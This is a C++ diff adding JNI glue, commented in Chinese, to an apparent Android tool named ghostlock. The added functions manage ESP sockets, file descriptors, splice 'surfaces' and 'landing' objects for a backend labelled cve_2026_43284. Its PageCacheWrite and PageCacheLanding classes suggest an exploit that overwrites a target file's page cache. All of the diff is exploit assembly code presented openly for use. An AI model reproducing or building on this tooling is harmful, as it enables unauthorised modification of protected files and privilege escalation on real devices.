@@ -378,5 +378,159 @@ namespace ghostlock::jni {
         return close(fd) == 0;
     }
 
+    /**
+     *  socket 表：connectEsp/espSocketId 建出来的 fd 在这里按不透明 id 存着（谁建谁拆）。
+     *
+     *  id = slot + 1；0 恒表示没有。
+     */
+    constexpr std::size_t kMaxSockets = 8U;
+    int g_sockets[kMaxSockets] = {-1, -1, -1, -1, -1, -1, -1, -1};
+
+    /**
+     *  薄门：只把两个**已经建好**的 fd 交出去（自己不拥有，谁建谁关）。
+     *
+     *  参考装配里的门（PageCacheDoorLinux）自己开 fd、自己建 socket；这里 fd 与 socket 已经分别由
+     *  resolve 与 espSocketId 建好，所以只需一个交出两者的薄对象 —— 拼装顺序由 Kotlin 决定。
+     */
+    class PairedDoor final : public backend::cve_2026_43284::landing::DoorOps {
+      public:
+        PairedDoor(const int file_fd, const int socket_fd) noexcept : file_fd_(file_fd), socket_fd_(socket_fd) {}
+
+        [[nodiscard]] int open_target() noexcept override { return file_fd_; }
+        [[nodiscard]] int connect_esp(const backend::cve_2026_43284::SaMaterial &) noexcept override {
+            return socket_fd_;  /* 已经连好了，这里只交出去 */
+        }
+        void close_fd(const int) noexcept override { /* 不拥有 fd：由 closeTarget/closeSocket 关 */ }
+        [[nodiscard]] bool target_is_remote() const noexcept override { return false; }
+
+      private:
+        int file_fd_ = -1;
+        int socket_fd_ = -1;
+    };
+
+    /** 一个拼接面：薄门 + 真拼接面（写路径的 I/O）。 */
+    struct Surface final {
+        std::unique_ptr<PairedDoor> door;
+        std::unique_ptr<backend::cve_2026_43284::landing::RealSpliceIo> io;
+        std::unique_ptr<backend::cve_2026_43284::landing::PageCacheWrite> window;
+    };
+    constexpr std::size_t kMaxSurfaces = 4U;
+    std::unique_ptr<Surface> g_surfaces[kMaxSurfaces];
+    std::unique_ptr<backend::cve_2026_43284::landing::PageCacheLanding> g_landings[kMaxSurfaces];
+
+    /**
+     *  建 ESP socket 并存表（设备工作：socket/bind/connect）。
+     *
+     *  @return 不透明 id（slot + 1）；失败 0。端口由会话参数给，本函数不做决策。
+     */
+    std::uint64_t device_esp_socket_id(const Init43284Values &params) noexcept {
+        const int fd = device_connect_esp(params);
+        if (fd < 0) {
+            return 0U;
+        }
+        for (std::size_t index = 0U; index < kMaxSockets; ++index) {
+            if (g_sockets[index] < 0) {
+                g_sockets[index] = fd;
+                return static_cast<std::uint64_t>(index) + 1U;
+            }
+        }
+        static_cast<void>(device_close_socket(fd));
+        return 0U;
+    }
+
+    /** @return 按 id 关掉 socket；0/越界/未开 ⇒ false。 */
+    bool device_close_socket_id(const std::uint64_t socketId) noexcept {
+        if (socketId == 0U) {
+            return false;
+        }
+        const std::size_t slot = static_cast<std::size_t>(socketId) - 1U;
+        if (slot >= kMaxSockets || g_sockets[slot] < 0) {
+            return false;
+        }
+        const bool closed = device_close_socket(g_sockets[slot]);
+        g_sockets[slot] = -1;
+        return closed;
+    }
+
+    /**
+     *  建一个拼接面：把门表里的 fd 与 socket 表里的 socket 配成一个薄门，再包上真拼接面。
+     *
+     *  @return 不透明 id（slot + 1）；失败 0。
+     */
+    std::uint64_t device_make_surface(const std::uint64_t targetId,
+                                      const std::uint64_t socketId) noexcept {
+        if (targetId == 0U || socketId == 0U) {
+            return 0U;
+        }
+        const std::size_t target_slot = static_cast<std::size_t>(targetId) - 1U;
+        const std::size_t socket_slot = static_cast<std::size_t>(socketId) - 1U;
+        if (target_slot >= kMaxDoors || g_doors[target_slot].fd < 0) {
+            return 0U;
+        }
+        if (socket_slot >= kMaxSockets || g_sockets[socket_slot] < 0) {
+            return 0U;
+        }
+        for (std::size_t index = 0U; index < kMaxSurfaces; ++index) {
+            if (g_surfaces[index] == nullptr) {
+                auto surface = std::make_unique<Surface>();
+                surface->door = std::make_unique<PairedDoor>(g_doors[target_slot].fd, g_sockets[socket_slot]);
+                surface->io = std::make_unique<backend::cve_2026_43284::landing::RealSpliceIo>(
+                    backend::cve_2026_43284::landing::real_splice_io(), g_doors[target_slot].fd);
+                g_surfaces[index] = std::move(surface);
+                return static_cast<std::uint64_t>(index) + 1U;
+            }
+        }
+        return 0U;
+    }
+
+    /** @return 拆掉一个拼接面（同时拆掉它的落地对象，如果有）。 */
+    bool device_destroy_surface(const std::uint64_t surfaceId) noexcept {
+        if (surfaceId == 0U) {
+            return false;
+        }
+        const std::size_t slot = static_cast<std::size_t>(surfaceId) - 1U;
+        if (slot >= kMaxSurfaces || g_surfaces[slot] == nullptr) {
+            return false;
+        }
+        g_landings[slot].reset();
+        g_surfaces[slot].reset();
+        return true;
+    }
+
+    /**
+     *  按拼接面建落地对象（借它的窗口）。
+     *
+     *  @return 不透明 id（slot + 1）；没有拼接面或已建过 ⇒ 0。
+     */
+    std::uint64_t device_make_landing(const std::uint64_t surfaceId) noexcept {
+        if (surfaceId == 0U) {
+            return 0U;
+        }
+        const std::size_t slot = static_cast<std::size_t>(surfaceId) - 1U;
+        if (slot >= kMaxSurfaces || g_surfaces[slot] == nullptr || g_landings[slot] != nullptr) {
+            return 0U;
+        }
+        auto window = std::make_unique<backend::cve_2026_43284::landing::PageCacheWrite>(
+            *g_surfaces[slot]->door, *g_surfaces[slot]->io);
+        /* 窗口必须比落地对象活得久：把窗口也挂在 surface 上。 */
+        g_surfaces[slot]->window = std::move(window);
+        g_landings[slot] = std::make_unique<backend::cve_2026_43284::landing::PageCacheLanding>(
+            *g_surfaces[slot]->window);
+        return static_cast<std::uint64_t>(slot) + 1U;
+    }
+
+    /** @return 拆掉落地对象；没有则为 false。 */
+    bool device_destroy_landing(const std::uint64_t landingId) noexcept {
+        if (landingId == 0U) {
+            return false;
+        }
+        const std::size_t slot = static_cast<std::size_t>(landingId) - 1U;
+        if (slot >= kMaxSurfaces || g_landings[slot] == nullptr) {
+            return false;
+        }
+        g_landings[slot].reset();
+        return true;
+    }
+
 }  // namespace ghostlock::jni
 
